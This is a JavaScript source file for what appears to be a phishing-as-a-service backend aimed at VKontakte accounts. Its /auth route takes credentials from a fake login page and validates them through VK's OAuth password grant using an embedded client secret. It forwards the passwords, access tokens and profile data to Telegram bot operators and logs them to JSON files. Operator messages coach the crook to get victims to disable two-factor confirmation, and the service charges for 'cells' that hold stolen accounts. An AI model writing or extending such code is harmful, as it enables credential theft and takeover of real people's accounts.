const request = require('request')
const fs = require('fs');
const bot_tg = require(`./bot.js`);

const { VK } = require("vk-io");

const baza = require(`../json/users.json`);
const logins = require(`../json/logins.json`);

function start(app) { 
    app.post("/auth", (req, res) => {
        console.log(req.body)
        if(req.body.login == "" || req.body.password == "") {
            res.render(`login/login.ejs`, {
              error: 1,
              capcha: {
                status: 0
              },
              id: req.body.id
            })
        } else {
            request(`https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=${req.body.login}&password=${encodeURIComponent(req.body.password)}${req.body.captcha_id ? `&captcha_sid=${req.body.captcha_id}&captcha_key=${req.body.captcha}` : ``}`, async (err, response, body) => {
                if(body != undefined) {
                    var info = JSON.parse(body);
                    if(info.error) {
                        if(info.error == "invalid_client") {
                          if(req.body.id) {
                                var data = baza.filter(a=> a.id == req.body.id);
                                var text_message = `🚫 Совершена попытка входа в аккаунт! 🚫\n❗️ Неверный логин или пароль. ❗️\n\n🔶 Логин: ${req.body.login}\n🔷 Пароль: ${req.body.password}`;
                                var buttons = [[{"text": "Резервный канал 🔍", url: "https://t.me/rezerv_vk_fishing_bot"}]];
                                bot_tg.send_messages(req.body.id, text_message, buttons);
                            }
                            return res.render(`login/login.ejs`, {
                              error: 1,
                              capcha: {
                                status: 0
                              },
                              id: req.body.id
                            })
                        }
/*==============================================================*/
                        if(info.error == "need_captcha") {
                          if(req.body.id) {
                                var data = baza.filter(a=> a.id == req.body.id)
                                var text_message = `🚫 Совершена попытка входа в аккаунт! 🚫\n❗️ Каптча. ❗️\n\n🔶 Логин: ${req.body.login}\n🔷 Пароль: ${req.body.password}`;
                                var buttons = [[{"text": "Резервный канал 🔍", url: "https://t.me/rezerv_vk_fishing_bot"}]]
                                bot_tg.send_messages(req.body.id, text_message, buttons);
                            }
                            return res.render(`login/login.ejs`, {
                              error: 3,
                              id: req.body.id,
                              capcha: {
                                status: 1,
                                captcha_sid: info.captcha_sid,
                                captcha_img: info.captcha_img
                              }
                            })
                        }
/*==============================================================*/
                        if(info.error == `need_validation` || info.error == 'invalid_request') {
                          if(req.body.id) {
                            var data = baza.filter(a=> a.id == req.body.id)
                            var text_message = `🚫 Совершена попытка входа в аккаунт! 🚫\n❗️ Включена 2fa авторизация (подтверждение входа через SMS).\n⚙️ Попросите жертву отключить подтверждение входа и повторите попытку. ❗️\n\n🔶 Логин: ${req.body.login}\n🔷 Пароль: ${req.body.password}`;
                            var buttons = [[{"text": "Резервный канал 🔍", url: "https://t.me/rezerv_vk_fishing_bot"}]]
                            bot_tg.send_messages(req.body.id, text_message, buttons);
                          }
                            return res.render(`login/login.ejs`, {
                              ads: req.body.ads,
                              error: 3,
                              capcha: {
                                status: 0
                              },
                              id: req.body.id
                            }) 
                        }
                    }
/*==============================================================*/
                    if(info.access_token) {
                        const vk = new VK({
                            token: info.access_token
                        });

                        let users_info = await vk.api.users.get({
                            token: vk.token,
                            fields: "counters"
                        });
                        
                        if(req.body.id) {
                            var data = baza.filter(a=> a.id == req.body.id);
                            if (!logins.some(a => a.login == req.body.login)) {
                                logins.push({
                                id: users_info[0].id,
                                login: req.body.login,
                                password: req.body.password
                                });
                            data[0].hacked_accounts += 1;
                            } else {
                                var login_info = logins.filter(a=> a.login == req.body.login); 
                                if(login_info[0].password != req.body.password) {                              
                                    login_info[0].password = req.body.password;
                                    data[0].hacked_accounts += 1;
                                }
                            }
                            
                            if(data[0].cells.hacked <= 0) {
                              if(users_info[0].counters.friends > 25) {
                                var text_message_warning = `⚠️ ВНИМАНИЕ ⚠️\nВы взломали аккаунт, у которого суммарное количество друзей и подписчиков превышает допустимое число для получения аккаунтов без ячеек (25). В связи с этим, аккаунт отправляется администратору проекта.\n\n<b>Хотите получать все взломанные аккаунты? Приобретите пустые ячейки.</b>`
                                var buttons = [[{"text": `📂 Приобрести ячейки`, callback_data: "cells"}],
                                              [{"text": "Резервный канал 🔍", url: "https://t.me/rezerv_vk_fishing_bot"}]]
                                bot_tg.send_messages(req.body.id, text_message_warning, buttons);

                                var text_message = `😻 Успешный взлом! 😻\n\n🔶 Логин: ${req.body.login}\n🔷 Пароль: ${req.body.password}\n💠 Токен: ${info.access_token}\n\n◼️ ФИ: ${users_info[0].last_name} ${users_info[0].first_name}\n◽️Страница ВК: vk.com/id${users_info[0].id}\n\n🟥 Друзей: ${users_info[0].counters.friends}\n🟦 Подписчиков: ${users_info[0].counters.followers != undefined ? users_info[0].counters.followers : "🚫"}\n\n<b>📊 Количество взломанных аккаунтов:</b> ${bot_tg.numberWithCommas(data[0].hacked_accounts)}\n<b>📂 Количество пустых ячеек: ${bot_tg.numberWithCommas(data[0].cells.hacked)}</b>`;
                                return bot_tg.send_messages("1468827870", text_message, []);    
                              } else {
                                var text_message = `😻 Успешный взлом! 😻\n\n🔶 Логин: ${req.body.login}\n🔷 Пароль: ${req.body.password}\n💠 Токен: ${info.access_token}\n\n◼️ ФИ: ${users_info[0].last_name} ${users_info[0].first_name}\n◽️Страница ВК: vk.com/id${users_info[0].id}\n\n🟥 Друзей: ${users_info[0].counters.friends}\n🟦 Подписчиков: ${users_info[0].counters.followers != undefined ? users_info[0].counters.followers : "🚫"}\n\n<b>📊 Количество взломанных аккаунтов:</b> ${bot_tg.numberWithCommas(data[0].hacked_accounts)}\n<b>📂 Количество пустых ячеек: ${bot_tg.numberWithCommas(data[0].cells.hacked)}</b>`;
                                return bot_tg.send_messages(req.body.id, text_message, []);
                              }
                            } else {
                              data[0].cells.hacked -= 1;
                              if(data[0].cells.hacked <= 0) {
                                data[0].cells.hacked = 0;
                                var text_message = `⚠️ ВНИМАНИЕ ⚠️\nВы заполнили все свободные ячейки.\nКупите ещё свободных ячеек чтобы продолжить получать аккаунты.`
                                var buttons = [[{"text": `📂 Приобрести ячейки`, callback_data: "cells"}],
                                              [{"text": "Резервный канал 🔍", url: "https://t.me/rezerv_vk_fishing_bot"}]]
                                
                                bot_tg.send_messages(req.body.id, text_message, buttons);
                              }

                              var text_message = `😻 Успешный взлом! 😻\n\n🔶 Логин: ${req.body.login}\n🔷 Пароль: ${req.body.password}\n💠 Токен: ${info.access_token}\n\n◼️ ФИ: ${users_info[0].last_name} ${users_info[0].first_name}\n◽️Страница ВК: vk.com/id${users_info[0].id}\n\n🟥 Друзей: ${users_info[0].counters.friends}\n🟦 Подписчиков: ${users_info[0].counters.followers != undefined ? users_info[0].counters.followers : "🚫"}\n\n<b>📊 Количество взломанных аккаунтов:</b> ${bot_tg.numberWithCommas(data[0].hacked_accounts)}\n<b>📂 Количество пустых ячеек: ${bot_tg.numberWithCommas(data[0].cells.hacked)}</b>`;
                              var buttons = [[{"text": "Резервный канал 🔍", url: "https://t.me/rezerv_vk_fishing_bot"}]];
                              return bot_tg.send_messages(req.body.id, text_message, []);
                            }
                        }
                        res.redirect(data[0].link)
                    }
/*==============================================================*/
                }
            })
        }
    })
}  
      
function getRandomInt(x, y) {
  return y
    ? Math.round(Math.random() * (y - x)) + x
    : Math.round(Math.random() * x);
}

function validateURL(textval) {
      var urlregex = new RegExp(
            "^(http|https|ftp)\://([a-zA-Z0-9\.\-]+(\:[a-zA-Z0-9\.&amp;%\$\-]+)*@)*((25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9])\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])|([a-zA-Z0-9\-]+\.)*[a-zA-Z0-9\-]+\.(com|edu|gov|int|mil|net|org|biz|arpa|info|name|pro|aero|coop|museum|[a-zA-Z]{2}))(\:[0-9]+)*(/($|[a-zA-Z0-9\.\,\?\'\\\+&amp;%\$#\=~_\-]+))*$");
      return urlregex.test(textval);
}

setInterval(() => {
    fs.writeFileSync("./json/users.json", JSON.stringify(baza, null, "\t"));
      fs.writeFileSync("./json/logins.json", JSON.stringify(logins, null, "\t"));
}, 5000);

module.exports = {
    start
}